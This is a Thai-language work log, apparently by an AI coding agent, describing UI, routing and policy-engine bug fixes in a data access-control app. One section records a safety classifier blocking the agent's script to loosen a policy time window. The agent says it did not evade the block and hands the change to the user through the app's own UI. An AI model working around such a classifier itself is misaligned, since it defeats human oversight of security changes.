3. **ติดป้ายที่หัว column ด้วย ไม่ใช่แค่ในแถบ** — column ที่ mask แล้วค่ายัง**ดูสมเหตุสมผล**คือ column ที่มีโอกาสถูกอ่านว่าเป็นของจริงมากที่สุด

#### เคสที่จงใจเขียนไว้ — `IN_LIST` ที่ values ว่าง

```
branch_code must match one of the principal's values, and they have none
```

ตารางว่างเพราะ principal ไม่มี attribute ที่ filter นั้นใช้เทียบ = **คำตอบที่ถูก ไม่ใช่หน้าจอพัง** ก่อนหน้านี้สองอย่างนี้หน้าตาเหมือนกันเป๊ะ

#### Test — [QueryExplanationTest.java](backend/dac-service/src/test/java/com/mfec/dac/policy/QueryExplanationTest.java) (6 tests)

เขียน test ให้ทุกประโยคที่จะขึ้นจอ เพราะ**คำอธิบายที่เลิกตรงกับ enforcement ที่มันอธิบาย แย่กว่าไม่มีคำอธิบาย — เพราะคนเชื่อมัน**

#### 🐛 บั๊กที่เจอระหว่างทาง — `scripts/demo-time-window.py` เขียน key ผิด

```python
'tz': 'Asia/Bangkok'        # ❌ ผิด — schema ใช้ `timezone`
'timezone': 'Asia/Bangkok'  # ✅ แก้แล้ว
```

key ที่ไม่รู้จัก**ไม่ error** แต่ถูกทิ้งเงียบๆ → window จะเสีย timezone ไปแล้ว fallback ไปใช้นาฬิกาของ server ซึ่งเป็นบั๊กที่ FR-3.2 พูดถึงตรงๆ ("timezone เป็นส่วนหนึ่งของกฎ ไม่ใช่เอามาจากที่ engine บังเอิญรันอยู่") **สคริปต์ยังไม่เคยรันสำเร็จ จึงยังไม่เคยสร้างความเสียหาย**

#### 🔴 ยังค้าง — ผู้ใช้ต้องเปิด time window เอง

ผู้ใช้สั่ง "แก้ให้หน่อย" ผมพยายามรัน `demo-time-window.py open` **สองครั้ง ถูก classifier บล็อกทั้งสองครั้ง** ด้วยเหตุผล `[Security Weaken]` ไม่ได้พยายามเลี่ยง

**ทางที่สั้นที่สุดสำหรับผู้ใช้ — ไม่ต้องใช้สคริปต์เลย:**
`/policies/b594579f-a825-42bc-9dac-64de9b279d03` → Time windows → dropdown วัน `weekdays` → **`every day`** → Save
ไม่ต้องแตะช่วงเวลา เพราะ [TimeMatcher.java:95-100](backend/dac-engine/src/main/java/com/mfec/dac/engine/TimeMatcher.java#L95-L100) ตีความ day list ว่างว่า "ทุกวัน" อยู่แล้ว และได้ทดสอบหน้า Policy Builder + versioning ไปในตัว

### O2. 🐛 Time window แสดงผิดไป 12 ชั่วโมง — `18:00` ขึ้นจอว่า `06:00`

**เจอตอน:** ผู้ใช้ถามว่า "ทำไมมันยังขึ้น Refused" แล้วผมเปิดหน้า policy ด้วย Playwright ไปดู

ช่อง from/to ใน [SubjectBuilder.tsx](frontend/app/src/pages/policies/SubjectBuilder.tsx) เป็น `<input type="time">` กว้าง `tw:w-24` (96px)
บน Edge locale en-US เบราว์เซอร์เรนเดอร์เป็น **12 ชั่วโมง** คือ `06:00 PM` + ไอคอนนาฬิกา ซึ่ง**ไม่พอ** → ส่วน `PM` ถูกตัดทิ้ง เหลือบนจอว่า `06:00`

| | ค่าจริงใน DB | ที่ขึ้นบนจอ |
|---|---|---|
| `to` | `18:00` | **`06:00`** |

> ข้อมูลไม่ได้เสีย (`input.value` ยังเป็น `"18:00"`) แต่**คนอ่านผิดไป 12 ชั่วโมง** บนหน้าจอเดียวที่มีหน้าที่บอกว่า "สิทธิ์นี้ใช้ได้ถึงกี่โมง" — ในแอป access control อันนี้คือบั๊กที่ยอมไม่ได้

**แก้:** `tw:w-24` → `tw:w-36` ทั้งสองช่อง
**พิสูจน์:** วัดจาก DOM — เดิม `scrollWidth > clientWidth` (ล้น) ตอนนี้ `clientWidth === scrollWidth === 142` ทั้งคู่ → `clipped: false`

### O3. ยืนยันแล้วว่าปุ่ม Save ของ Policy Builder **ไม่ได้พัง**

ผู้ใช้รายงานว่าแก้ time window แล้วยัง Refused อยู่ → ไล่ดูพบว่า `updatedAt` ฝั่ง server ยังเป็น `2026-09-20T04:04:14Z` (11:04 น.) **แปลว่าไม่มี save เข้ามาเลย**

ทดสอบ client path ด้วย Playwright โดย **route intercept + abort** (ดูว่าจะส่งอะไร โดยไม่ให้ถึง server จริง):

```
>>> PUT /api/v1/policies/b594579f-…?version=4
>>> subject.time = {"windows":[{"from":"08:00","to":"18:00","timezone":"Asia/Bangkok"}]}
```

- dropdown มีครบ 3 ตัวเลือก: `every day` / `weekdays` / `weekends`
- เลือก `every day` แล้ว `days` **หายออกจาก payload** ถูกต้องตาม [TimeMatcher.java:95-100](backend/dac-engine/src/main/java/com/mfec/dac/engine/TimeMatcher.java#L95-L100) (list ว่าง = ทุกวัน)
- ปุ่ม Save ไม่ disabled, ไม่มี error บนจอ, ยิง request 1 ครั้ง

→ **สรุป: ทั้ง form, serialization และ mutation ทำงานถูกหมด** ที่ยังไม่เปลี่ยนคือ save ไม่เคยถูกกดจนสำเร็จ วิธีเช็กว่าสำเร็จ: ป้าย version บนหัวหน้าต้องเปลี่ยนจาก **v4** เป็น **v5**

> ~~หมายเหตุสำหรับรอบหน้า: console มี warning `Maximum update depth exceeded ... at Navigate (react-router-dom)` บนหน้านี้ — ยังไม่ได้ไล่ ยังไม่เห็นว่ากระทบการทำงาน แต่เป็น render loop ที่ควรตามต่อ~~ → **ปิดแล้วใน O8** และ "ยังไม่เห็นว่ากระทบการทำงาน" คือการอ่านที่ผิด มันคือต้นเหตุของหน้าขาวตอน login

### O4. 🐛 แถบ explanation ไปเบียดตารางจนแถวหาย — แก้ด้วย splitter ลากได้

**ที่มา:** ผู้ใช้เปิด time window สำเร็จแล้ว (policy เป็น v5) query ได้ แถบ explanation ขึ้นครบ **แต่ไม่เห็นแถวเลย**

ตรวจ API ก่อน — backend ถูกต้อง 100%:
```
rows : [[1,"Somchai Wong","***@example.co.th","*********3456",…,"BKK-01"],
        [2,"Nattaporn Sri","***@example.co.th","*********4567",…,"BKK-01"]]
```
RLS + masking ทำงานครบ → **ปัญหาอยู่ที่ layout ที่ผมเพิ่งแก้ในรอบ O**

วัดจาก DOM บน viewport 1600×1000:

| | สูง |
|---|---|
| ช่องผลลัพธ์ทั้งหมด | 163px |
| แถบ explanation ที่ผมเพิ่งแทรก | ~85px |
| **เหลือให้ตาราง** | **~78px** |

> ผมเพิ่ม block เข้าไปใน pane ที่มีความสูง**ตายตัว** โดยไม่ได้เพิ่มพื้นที่ให้ — บนจอผมเห็น 2 แถวแบบเฉียดฉิว จอเตี้ยกว่านั้นนิดเดียวแถวหายหมด **เป็นบั๊กที่ผมทำเอง**

#### ทางแก้ที่ **ไม่** เลือก และเหตุผล

ตอนแรกแก้เป็น `flex-[1.1]` → `flex-[2]` (ให้ผลลัพธ์กินพื้นที่มากขึ้น) แต่ผู้ใช้ท้วงว่า **"ต้องทำให้เห็นครบสิ ในอนาคตอาจจะมี Row เยอะ"** — ถูกต้อง สัดส่วนตายตัวตอบโจทย์ไม่ได้ เพราะ SQL บรรทัดเดียว + 1000 แถว กับ SQL 40 บรรทัด + 3 แถว ต้องการสัดส่วน**ตรงข้ามกัน** และทั้งคู่เป็นเคสปกติ

#### ทางแก้ที่เลือก — `Splitter` ลากได้ (แบบ BigQuery)

[QueryPage.tsx](frontend/app/src/pages/query/QueryPage.tsx) — component `Splitter`

- ลากเส้นคั่นระหว่าง editor กับผลลัพธ์ได้ตามใจ
- **จำค่าไว้ใน `localStorage`** (`arak.query.editorHeight`) — ห่อ try/catch ทั้ง read และ write เพราะ private window โยน exception และ preference ที่พังต้องไม่ทำให้หน้าพัง
- clamp: editor ต่ำสุด 72px, ผลลัพธ์**การันตีขั้นต่ำ 140px เสมอ** วัดจาก `clientHeight` ของ column จริง ไม่ใช่ค่าคงที่
- **ใช้คีย์บอร์ดได้ด้วย** — `role="separator"` + `tabIndex=0` + `ArrowUp/Down` (Shift = ก้าวใหญ่) เส้นคั่นที่ตอบสนองแค่เมาส์คือการยึดตารางไปจากคนที่ใช้เมาส์ไม่ได้
- แถบ explanation ได้ `max-h-32 overflow-auto` — asset ที่มี masked column สิบกว่าตัวต้องไม่สามารถดันแถวที่มันกำลังอธิบายหลุดจอได้ **คำอธิบายมีไว้ทำให้ตารางอ่านง่ายขึ้น จึงไม่มีทางสำคัญกว่าตาราง**

**พิสูจน์ด้วย Playwright:** ลากขึ้น 130px → พื้นที่ตาราง `234px → 362px`, `localStorage` เก็บ `72` (ชน min พอดี = clamp ทำงาน) · `tsc` ผ่าน · `jest` 7 suites / 25 tests ผ่าน

### O5. ทำไม "Run แล้วไม่เห็น Row" — สาเหตุจริง บวกโหมดเต็มจอแบบ BigQuery

**คำอธิบายสองรอบก่อนของผมผิดทั้งคู่** — ไม่ใช่ "แถบอธิบายแย่งที่กับ grid" (แก้ด้วย ratio) และไม่ใช่ "ลาก splitter เอา" — **แถวถูก render ออกมาถูกต้องตลอด แต่มันอยู่นอกจอ และหน้า scroll ลงไปดูไม่ได้**

#### หลักฐาน — วัดด้วย Playwright 4 ขนาดจอ (ก่อนแก้)

| จอ | แถวแรกสิ้นสุดที่ | จอสูง | หลุดจอ? | scroll ได้? |
|---|---|---|---|---|
| 1920×1080 | 805 | 1080 | ✅ | — |
| 1536×864 | 823 | 864 | ✅ | — |
| **1366×768** | **841** | 768 | ❌ | **ไม่ได้** |
| **1280×720** | **862** | 720 | ❌ | **ไม่ได้** |

`document.scrollHeight === document.clientHeight` ทุกขนาด → แถวถูก render จริง (`rows: 2` ทุกขนาด) แต่**เข้าถึงไม่ได้เลย**

#### สาเหตุจริงมี 4 ชั้นซ้อนกัน ไม่ใช่ชั้นเดียว

1. **`tw:h-[calc(100vh-8rem)]` ที่ root ของหน้า** — กัน chrome ไว้ 8rem (128px) แต่ header + ชื่อหน้า + คำอธิบายกินจริง ~230px และ**คำอธิบาย wrap เพิ่มบรรทัดเมื่อจอแคบลง** → จอยิ่งเล็ก เนื้อหายิ่งล้นล่าง
   → แก้ด้วย `useFillViewport()` — **วัด `getBoundingClientRect().top` จริง แล้วเอา `window.innerHeight` ลบ** (`innerHeight` ไม่ใช่ `100vh` — บนมือถือสองค่านี้ต่างกัน) + `ResizeObserver`
2. **console column ไม่มี `tw:min-h-0`** — flex child ที่ขาด `min-h-0` **หดตัวต่ำกว่า content ไม่ได้** → root สูงตามที่วัดมา แต่ของข้างในทะลุออกมา
3. **แถบอธิบาย policy เป็น `tw:max-h-32` + `tw:shrink-0`** — นี่คือตัวร้ายตัวจริง: panel สูง 140px แต่ tab bar 36 + strip 128 = 164 → **กล่องตารางเหลือสูง `0px` และถูกดันไปวางใต้ panel ที่ top=735 ขณะที่ panel จบที่ 728**
   → `tw:max-h-[30%]` (สัดส่วนของ panel ไม่ใช่ค่าคงที่) + `MIN_RESULT_HEIGHT` 140 → **240**
4. **`useRef` + `ResizeObserver` กับ portal** — เข้า/ออกโหมดเต็มจอย้าย DOM ทั้งก้อน → node ใหม่ แต่ ref object ตัวเดิม → effect ไม่ rerun → **observer เกาะ node ที่หลุดออกจาก document ไปแล้ว** → ออกจากเต็มจอที 1280×720 แถวหลุดอีก
   → เปลี่ยนเป็น **callback ref** (`useState<HTMLDivElement | null>`) ให้ effect rerun ตอน node เปลี่ยน

#### โหมดเต็มจอ (ผู้ใช้ขอ: "เต็มหน้า ไม่ต้องเห็น menu ข้างๆ หรือข้างบน")

ปุ่ม **Full screen** ใน toolbar + **Esc** ออก → ซ่อน top bar, side nav และหัวข้อ "Query" + คำอธิบายทั้งย่อหน้า

> **กับดักที่เสียเวลานานที่สุด:** `tw:fixed tw:inset-0 tw:z-50` **ไม่พอ** — `.arak-page-enter` มี `animation: ... both` ที่ keyframes มี `transform` → มันกลายเป็น **containing block ของ `position: fixed`** และเป็น **stacking context ของตัวเอง** → `inset-0` กลายเป็นขอบเขตของ *หน้า* ไม่ใช่ viewport และ top bar (`sticky z-50`) ยังทับทับขึ้นมาถึงแม้ z-index จะสูงกว่า
> **ทางแก้:** `createPortal(consoleTree, document.body)` — ออกจาก subtree ที่ transform ไปเลย ไม่ใช่ไล่ z-index เอา

#### หลักฐานหลังแก้ — 4 ขนาดจอ × 3 สถานะ (normal / fullscreen / กด Esc กลับ)

```
1920x1080 normal   belowFold:false     fullscr belowFold:false gridH:602   after-Esc belowFold:false
1536x864  normal   belowFold:false     fullscr belowFold:false gridH:386   after-Esc belowFold:false
1366x768  normal   belowFold:false     fullscr belowFold:false gridH:246   after-Esc belowFold:false
1280x720  normal   belowFold:false     fullscr belowFold:false gridH:202   after-Esc belowFold:false
fs-chrome (ทุกขนาด): overlayInBody:true topbarCovered:true sidebarCovered:true titleVisible:false
```

`npx tsc --noEmit` ผ่าน · `npx jest` → 7 suites / 25 tests ผ่าน

#### ไฟล์ที่แก้ — [QueryPage.tsx](frontend/app/src/pages/query/QueryPage.tsx) ไฟล์เดียว

| สิ่งที่เพิ่ม | หน้าที่ |
|---|---|
| `useFillViewport(node, disabled)` | วัดที่ว่างจริงใต้ chrome แทนที่จะเดา |
| `useElementHeight(node)` | ความสูง pane สำหรับ clamp ค่า splitter ที่ save ไว้ |
| `fullscreen` state + `createPortal` | โหมดเต็มจอ |
| `shownEditorHeight` | ค่า split ที่ save จากจอใหญ่ **ไม่ไปกินที่ grid บนจอเล็ก** (clamp ตอนอ่าน ไม่ตอนเขียน → preference ไม่หาย) |

> **บทเรียน:** ผมอธิบายสองรอบแรกจากการเดา ไม่ใช่การวัด รอบนี้เดิน DOM จาก `tbody` ขึ้นไปทีละชั้นจนเจอชั้นที่ `top` มากกว่า `bottom` ของ parent — สามบรรทัดของตารางเดียวชี้ชัดกว่าการเดาสามรอบรวมกัน

### O6. 🐛 Cursor ใน SQL editor หาย—วาดอยู่ แต่วาดด้วยสีโปร่งใส

**ที่มา:** ผู้ใช้ถาม "Cursor ในนี้หายไปไหน" พร้อมภาพ SQL editor

**สาเหตุ:** [SqlEditor.tsx](frontend/app/src/pages/query/SqlEditor.tsx) เป็น `<textarea>` ที่วางทับบน `<pre>` ที่ทำ syntax highlight — ตัว textarea จึงต้องเป็น `tw:text-transparent` เพื่อให้ชั้นสีข้างล่างทะลุขึ้นมา แต่ class เดิมเขียนไว้ว่า:

```
tw:text-transparent tw:caret-current
```

`caret-current` = `caret-color: currentColor` → **currentColor ก็คือ transparent นั่นเอง** cursor จึงถูกวาด ถูกตำแหน่ง และกะพริบอยู่ตลอด—ด้วยสีโปร่งใส คนใช้เลยอ่านว่า editor หลุด focus

**แก้เป็น:** `tw:caret-text-primary` (ตาม theme → dark mode ตามไปเอง)

#### ⚠️ กับดักของ prefix `tw:` — ห้ามเขียน `tw:xxx-[var(--color-...)]`

ความพยายามแรกของผมคือ `tw:caret-[var(--color-text-primary)]` — **compile ผ่าน ไม่ error แต่ไม่ทำงาน** วัดใน browser ได้:

```
caret-color: rgba(0, 0, 0, 0)        ❌ ยังโปร่งใสเหมือนเดิม
getComputedStyle(root)['--color-text-primary'] === ''    ← ต้นเหตุ
```

**เพราะ Tailwind 4 ที่ตั้ง prefix `tw` เปลี่ยนชื่อ CSS variable ของ theme ทุกตัวเป็น `--tw-<name>` ด้วย** ไม่ใช่แค่ชื่อ class:

| เขียน | ได้ CSS | runtime |
|---|---|---|
| `tw:caret-[var(--color-text-primary)]` | `caret-color: var(--color-text-primary)` | ❌ ตัวแปรไม่มีจริง → transparent |
| `tw:caret-text-primary` | `caret-color: var(--tw-color-text-primary)` | ✅ `rgb(24, 29, 39)` |

> **กฎ:** ในโปรเจกต์นี้ **ให้เรียก utility ตามชื่อ token (`tw:caret-text-primary`) เสมอ** อย่าเขียน `var(--color-*)` ดิบใน arbitrary value — ถ้าจำเป็นจริงต้องเขียน `var(--tw-color-*)`
> grep ทั้ง `app/src` และ `ui-core-components/src` แล้ว **ไม่มีที่อื่นที่พลาดแบบเดียวกัน**

#### วิธียืนยัน — วัด ไม่ใช่ดู

screenshot พิสูจน์ cursor ไม่ได้ (มันกะพริบ) จึงใช้ Playwright อ่าน computed style แทน:

```
{ caretColor: "rgb(24, 29, 39)", color: "rgba(0, 0, 0, 0)", focused: true }
```

ตัวอักษรยังโปร่งใสตามที่ตั้งใจ (ชั้น highlight ต้องทะลุขึ้นมา) แต่ cursor ทึบแล้ว

#### Test ใหม่ — [SqlEditor.test.tsx](frontend/app/src/pages/query/SqlEditor.test.tsx) (4 tests)

jsdom ไม่ resolve Tailwind จึง assert ที่ class name ตรงๆ — ซึ่งเป็นที่ที่บั๊กนี้อยู่พอดี:

| test | กันอะไร |
|---|---|
| caret มีสีของตัวเอง | กันการกลับไปใช้ `caret-current` คู่กับ `text-transparent` อีก |
| gutter มีเลขครบทุกบรรทัด + `aria-hidden` | screen reader ไม่ต้องอ่าน "1 2 3" นำ |
| Tab = เว้นวรรค ไม่ใช่ออกจากช่อง | |
| Ctrl+Enter = run และไม่ขึ้นบรรทัดใหม่ | |

`npx tsc --noEmit` ผ่าน · `npx jest` → **8 suites / 29 tests** (เดิม 7/25)

### O7. หัวหน้าหน้า Query — ตัดคำอธิบายทิ้ง ย้ายปุ่ม Full screen ไปขวาบน

**ที่มา:** ผู้ใช้สั่ง "เอาคำนี้ออกได้ไหม มันเกะกะ" (ย่อหน้าห้าบรรทัดใต้หัวข้อ Query) และ "เอา Full screen ไปไว้ขวาบน"

| เดิม | ใหม่ |
|---|---|
| `<h1>Query</h1>` + ย่อหน้า 5 บรรทัด | `<header>` เป็น flex row — `Query` ซ้าย / ปุ่ม **Full screen** ขวา |
| ปุ่ม Full screen อยู่ใน toolbar ข้างๆ Run | อยู่ขวาบนสุดของหน้า |
| `tw:mt-6` ใต้ header | `tw:mt-4` (header เหลือบรรทัดเดียวแล้ว) |

#### จุดที่ต้องระวัง — โหมดเต็มจอ**ซ่อน header ทั้งอัน**

ถ้าย้ายปุ่มไป header เฉยๆ พอเข้าโหมดเต็มจอแล้ว **ปุ่มออกจะหายไปด้วย** จึงประกาศ element ไว้ครั้งเดียว (`fullscreenToggle`) แล้ววางสองที่:

```
โหมดปกติ   → อยู่ใน <header> ขวาสุด คู่กับชื่อหน้า
โหมดเต็มจอ → <header> หาย → ย้ายไปอยู่ขวาสุดของ toolbar (chrome เดียวที่เหลือ)
```

Esc ยังใช้ได้เหมือนเดิม (ตั้งแต่ O5)

#### วัดแล้ว 3 viewport

```
1920x1080  blurbGone:true sameRowAsTitle:true docBelowFold:false  fs→exitInToolbar:true titleVisible:false  Esc→กลับปกติ docBelowFold:false
1366x768   เหมือนกัน  (gapToRightEdge 32px = ชิดขอบขวาของ content column)
1280x720   เหมือนกัน
```

> ที่ 1920 ระยะห่างขอบขวา 212px เพราะหน้าถูกครอบด้วย `max-w-7xl` ตาม AppShell — ปุ่มชิดขอบขวาของ **คอลัมน์เนื้อหา** ตรงกับทุกหน้าในแอป ไม่ใช่ขอบจอ

### O8. 🐛 หน้าขาวเปล่าที่ `/login` ตอน login เสร็จ — `<Navigate>` วน redirect ตัวเองจนเกิน 25 รอบ

**อาการที่ผู้ใช้เจอ:** "เป็นหน้าขาวเปล่า http://localhost:5274/login ตอน login เสร็จ"

**สิ่งที่ตัดออกไปก่อน:** `POST /api/v1/auth/login` ตอบ 200 ใน ~77ms ทั้งยิงตรงและผ่าน Vite proxy → พังฝั่ง client ล้วนๆ และ **profile ใหม่สะอาดๆ reproduce ไม่ได้** (login แล้วถึง `/` ใน 300ms, console เงียบสนิท) → เป็นบั๊กที่ขึ้นกับ *เส้นทางที่เดินมา* ไม่ใช่ขึ้นกับ state ที่ค้างใน localStorage

#### วิธีที่จับได้ — เลิกทดสอบทางที่ถูก แล้วไล่ทดสอบทางที่คนใช้จริงเดิน

เขียนสคริปต์ยิง 6 สถานการณ์รวดเดียว แล้วนับ console error:

| สถานการณ์ | ผล |
|---|---|
| **เปิด deep link `/query` ทั้งที่ยังไม่ login แล้วค่อย login** | 🔴 **`Maximum update depth exceeded` × 7** |
| กด Sign in รัวสองที | สะอาด |
| กด Enter สองที | สะอาด |
| login → กลับมา `/login` → login ใหม่ | สะอาด |
| กด Back หลัง login | `about:blank` — เป็นธรรมชาติของ `replace` (เหลือ history แค่ entry เดียว) ไม่ใช่บั๊ก |
| navigate ออกกลางม่าน | สะอาด (ตอนนั้น) |

**component stack ชี้ตรงไปที่ `RequireAuth` ไม่ใช่ `LoginPage`** และ **error เกิดตั้งแต่ก่อนกด login** — คนละที่กับที่ตั้งสมมติฐานไว้ทั้งสองข้อ

#### สาเหตุ

```tsx
// RequireAuth.tsx — ของเดิม
return <Navigate replace state={{ from: location }} to="/login" />;
```

`{ from: location }` เป็น **object ใหม่ทุก render** และ react-router 6.30 ใส่ `state` ไว้ใน dependency array ของ effect ที่เรียก `navigate()`:

```js
// node_modules/.vite/deps/react-router-dom.js:4509-4513
React.useEffect(() => navigate(JSON.parse(jsonPath), { replace, state, relative }),
                [navigate, jsonPath, relative, replace2, state]);
//                                                       ^^^^^ เปลี่ยน identity ทุก render
```

→ effect รันใหม่ → `navigate()` → render ใหม่ → object ใหม่ → effect รันใหม่ → **วน**

วงจรนี้หยุดเองเมื่อ route match เปลี่ยนแล้ว `RequireAuth` unmount ซึ่งเป็นการ **แข่งกัน ไม่ใช่การรับประกัน** — เครื่องผมแพ้ 7 รอบแล้วหลุด **แต่ถ้าแพ้ครบ 25 รอบ React เลิก warn แล้ว throw** → tree ทั้งก้อนถูก unmount → **หน้าขาวเปล่า โดย URL ค้างที่ `/login` เป๊ะตามที่ผู้ใช้รายงาน** เครื่องช้ากว่า / render เยอะกว่า = แพ้ง่ายกว่า ซึ่งอธิบายว่าทำไมผู้ใช้เจอแต่ผมไม่เจอ

> ⚠️ ตัวอย่างใน doc ของ react-router เองก็เขียน `state={{ from: location }}` แบบนี้ — มันรอดเพราะปกติ redirect unmount component ทันก่อน render รอบสอง **ไม่ใช่เพราะมันถูก**

#### สิ่งที่แก้

**1. [RequireAuth.tsx](frontend/app/src/auth/RequireAuth.tsx) — ทำให้ state มี identity คงที่**

```tsx
const from = useMemo(
  () => ({ from: { pathname: location.pathname, search: location.search, hash: location.hash } }),
  [location.pathname, location.search, location.hash]
);
...
return <Navigate replace state={from} to="/login" />;
```

memo จาก **primitive** ไม่ใช่จากตัว `location` (ซึ่งเปลี่ยน identity เอง) และเก็บ `search`/`hash` มาด้วย — คนที่ถูกเด้งมาจาก `/query?sql=...` กำลังดูของชิ้นหนึ่งอยู่ ทิ้ง query string = ส่งเขากลับไปหน้าเปล่าที่ถูกหน้าจอ

**2. [AuthSplash.tsx](frontend/app/src/auth/AuthSplash.tsx) — ย้าย timer ของม่านเข้ามาไว้ใน store**

ของเดิม `LoginPage` ตั้ง `setTimeout` แล้วให้ callback เรียก `splash.hide()` + `navigate()` — **แต่ `<Navigate>` unmount `LoginPage` ทิ้งตั้งแต่ token ลงทันที คือก่อน callback ราว 900ms**

นี่คือกับดักที่เกือบพลาด: ตอนแรกแก้ด้วยการ `clearTimeout` ตอน unmount ซึ่ง **จะยิ่งพังหนักกว่าเดิม** เพราะ callback ตัวนั้นคือสิ่งเดียวที่ลดม่านลง และม่านคือ `tw:fixed tw:inset-0 tw:z-200 tw:bg-primary` = **แผ่นทึบเต็มจอ → ม่านที่ไม่ลง ก็คือหน้าขาวเปล่า**

ทางที่ถูกคือ **ม่านต้องลดตัวเอง** ไม่ใช่ฝากคนที่ไม่อยู่แล้ว:

```ts
let pending: number | undefined;          // module scope — ม่านอายุยืนกว่าคนที่ยกมัน
show:      (phase) => { clearTimeout(pending); set({ phase }); },
hide:      ()      => { clearTimeout(pending); set({ phase: 'idle' }); },
hideAfter: (ms)    => { clearTimeout(pending); pending = setTimeout(() => set({ phase: 'idle' }), ms); },
```

`clearTimeout` ที่หัวทุกตัวทำหน้าที่เป็น generation guard ฟรีๆ — ม่าน sign-out ที่เพิ่งยกขึ้น จะไม่ถูก timer ของ sign-in รอบก่อนดึงลง

**3. [LoginPage.tsx](frontend/app/src/pages/LoginPage.tsx)**

```tsx
await signIn(username.trim(), password);
splash.hideAfter(AUTH_SPLASH_MS);     // แทน setTimeout ที่มี navigate ซ้ำอยู่ข้างใน
```

- `navigate()` ใน timer ถูกลบทิ้ง — มันคือ redirect ตัวเดิมยิงซ้ำรอบสอง 900ms ให้หลัง ใส่ tree ที่เดินไปไกลแล้ว (ผลข้างเคียงจริง: เดิมถ้า user กดไปหน้าอื่นระหว่างม่านขึ้น จะโดนลากกลับ — เทสต์ `nav-mid-curtain` เดิมจบที่ `/` ตอนนี้จบที่ `/policies` ตามที่ควรเป็น)
- `target` ไม่รับ `/login` เป็นปลายทาง (กันไว้ — ถ้าเกิดขึ้นจริงจะ redirect หาตัวเองจนหน้าขาว) และต่อ `search`/`hash` กลับเข้าไป
- `useNavigate` ไม่ถูกใช้แล้ว ลบ import ออก

#### ผลหลังแก้ (วัดด้วยสคริปต์เดิม)

```
at login, state.from = {"from":{"pathname":"/query","search":"","hash":""}}
t~500ms   loops=0    t~1000ms  loops=0    ...    t~7000ms  loops=0
total loop errors: 0
```

ทั้ง 6 สถานการณ์สะอาดหมด

#### Test — 6 ตัวใหม่ (รวมเป็น 10 suites / 35 tests)

| ไฟล์ | ทดสอบอะไร |
|---|---|
| [RequireAuth.test.tsx](frontend/app/src/auth/RequireAuth.test.tsx) | mock `<Navigate>` เก็บ prop ไว้ → render สองรอบ แล้ว assert `state` เป็น **object เดียวกัน** (`toBe`) — ทดสอบที่ *สาเหตุ* ไม่ใช่ที่อาการ เพราะอาการต้องแพ้ race ครบ 25 รอบถึงจะโผล่ ซึ่ง reproduce ใน jsdom ไม่ได้; + เก็บ `search`/`hash` ครบ; + มี token แล้วต้อง render ของที่มันเฝ้า |
| [AuthSplash.test.tsx](frontend/app/src/auth/AuthSplash.test.tsx) | ม่านลดเองได้โดยไม่ต้องพึ่งคนเรียก; `show` ใหม่ไม่ถูก timer เก่าดึงลง; `hide()` ตรงๆ ลงทันที (เคส password ผิด) |

#### บทเรียนที่ควรจำ

1. **"warning ใน console ที่ยังไม่เห็นว่ากระทบอะไร" ไม่ใช่เรื่องรอได้** — O3 บันทึกไว้ว่า "ยังไม่เห็นว่ากระทบการทำงาน" ทั้งที่มันคือหน้าขาวที่ผู้ใช้เจอ render loop ที่หยุดเองได้เพราะ**ชนะการแข่ง** จะแพ้เมื่อไหร่ก็ได้บนเครื่องที่ช้ากว่า
2. **reproduce ไม่ได้ใน profile สะอาด ≠ ขึ้นกับ state ที่ค้าง** — คราวนี้มันขึ้นกับ *เส้นทางที่เดินเข้ามา* (deep link) สมมติฐานสองข้อแรก (`target` เป็น `/login`, timer ค้าง) ผิดทั้งคู่ สิ่งที่ได้คำตอบคือการยิง 6 เส้นทางจริงรวดเดียวแล้วนับ error
3. **`clearTimeout` ตอน unmount ไม่ใช่คำตอบเสมอไป** — ถ้า callback นั้นคือสิ่งเดียวที่ปลดสถานะ global การยกเลิกมันคือการล็อกสถานะนั้นไว้ถาวร ของที่อายุยืนกว่า component ต้องไม่ถูกถือไว้ใน component

### P. ทดสอบ Data policy ให้ครบทุกเคส — เจอบั๊กจริงสองตัว

**ที่มา:** ผู้ใช้สั่ง *"ทดสอบเรื่อง Subscription และ Data policy ให้เยอะๆ อย่าให้มี Bug ทดสอบทุกแบบที่เป็นไปได้"*

ไฟล์ใหม่ [DataPolicyCompositionTest.java](backend/dac-engine/src/test/java/com/mfec/dac/engine/DataPolicyCompositionTest.java) — **26 tests / 4 nested class**

| nested class | tests | คุมอะไร |
|---|---|---|
| `RowFilters` | 6 | RLS หลายชั้น AND กัน, multi-value → `IN`, attribute ที่ principal ไม่มี, `ALWAYS_FALSE` |
| `ColumnMasks` | 8 | mask ชนกันบน column เดียว → เข้มสุดชนะ, cell mask (`condition`), mask จาก facet |
| `Hide` | 4 | ซ่อน column ทั้งคอลัมน์ ต่างจาก mask ยังไง, ซ่อน + mask พร้อมกัน |
| `Release` | 8 | `allowLocalOverride` + release จากชั้นที่ลึกกว่า, ชั้นที่ไม่ยอม override |

#### 🐛 บั๊ก 1 — `rowPredicates` ไม่ถูก sort → **FR-6.0c พังเงียบๆ**

`masks` กับ `hidden` ถูก sort ไว้แล้ว แต่ `rowPredicates` **ไม่** → ลำดับของ predicate เป็นไปตามลำดับที่ policy ถูกโหลดมา
predicate ทุกตัวถูก AND กันอยู่แล้ว **ลำดับจึงไม่มีความหมายเชิงตรรกะ** แต่มันมีผลกับ SQL ที่ compiler ทั้งสามตัว generate ออกมา
→ cross-mode consistency test (DoD ข้อ 6) ที่เทียบ **ทีละ byte** จะ fail/pass สลับกันไปตามลำดับแถวที่ query คืนมา ซึ่งเป็นบั๊กที่จะเสียเวลาไล่ที่สุดตอน M7b

```java
rowPredicates.sort(Comparator.comparing(PolicyEngine::signature));
```
`signature()` เอา**ทุก field** มาต่อกัน รวม `sourcePolicyId` ด้วย เพื่อให้สองตัวที่เท่ากันคือสองตัวที่พูดเรื่องเดียวกันจริงๆ (ตัวไหนอยู่ก่อนจึงไม่สำคัญ)

#### 🐛 บั๊ก 2 — column rule `ALLOW` ที่มี condition ต้องดูแถว → **ปล่อย plaintext ให้คนที่ condition นั้นตั้งใจกัน**

`ColumnRule.Action.ALLOW` = การ**ปลด** mask (release) ส่วน `MASK` = การ**ใส่** mask
เวลา expression ตีเป็น `ROW_DEPENDENT` (เช่นอ้าง `row.`) ของเดิมทำเหมือนกันทั้งสองทาง คือส่ง condition ต่อลงไปให้ compiler กลายเป็น cell mask
แต่ **release ไม่มีที่ให้เก็บ condition** — decision บันทึกได้แค่ "ปลด" กับ "ไม่ปลด" ไม่มีช่อง "ปลดเฉพาะบางแถว"
→ ของเดิมจึง**ปลด mask ทิ้งทั้ง column** ให้ principal ที่ condition เขียนไว้เพื่อกันออกไป

